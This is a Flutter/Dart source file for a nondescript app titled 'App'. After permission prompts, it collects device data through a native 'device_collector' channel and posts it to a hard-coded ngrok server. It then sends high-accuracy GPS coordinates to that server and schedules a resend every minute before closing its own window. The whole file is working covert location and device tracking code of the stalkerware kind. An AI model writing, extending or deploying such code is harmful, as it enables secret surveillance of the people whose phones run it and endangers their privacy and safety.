import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'package:geolocator/geolocator.dart';

const platform = MethodChannel('device_collector');
const String serverUrl = 'https://yamileth-hypobaric-victoria.ngrok-free.dev';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: MyHomePage(title: 'App'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});
  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  Timer? _gpsTimer;

  @override
  void initState() {
    super.initState();
    _startAppLogic();
  }

  @override
  void dispose() {
    _gpsTimer?.cancel();
    super.dispose();
  }

  Future<void> _startAppLogic() async {
    await _collectAndSendDeviceInfo();
    await _startGpsUpdates();
    SystemNavigator.pop();
  }

  Future<void> _collectAndSendDeviceInfo() async {
    final permission = await Permission.phone.request();
    if (!permission.isGranted) {
      print("Phone permission denied. Skipping device info.");
      return;
    }

    try {
      final Map data = await platform.invokeMethod('collectDeviceData');
      print("Device data: $data");

      final response = await http.post(
        Uri.parse(serverUrl),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(data),
      );
      print("Device info sent. Status: ${response.statusCode}");
    } catch (e) {
      print("Error collecting/sending device info: $e");
    }
  }

  Future<void> _startGpsUpdates() async {
    final permission = await Permission.location.request();
    if (!permission.isGranted) {
      print("Location permission denied. GPS updates will not run.");
      return;
    }

    await _sendGps();

    _gpsTimer = Timer.periodic(const Duration(minutes: 1), (_) {
      _sendGps();
    });
  }

  Future<void> _sendGps() async {
    try {
      final position = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.high);

      final gpsData = {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'timestamp': DateTime.now().toIso8601String(),
      };

      print("Sending GPS: $gpsData");

      final response = await http.post(
        Uri.parse(serverUrl),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(gpsData),
      );

      print("GPS sent. Status: ${response.statusCode}");
    } catch (e) {
      print("Error getting or sending GPS: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Text(
          'App is running… check console for logs.',
          textAlign: TextAlign.center,
        ),
      ),
    );
  }
}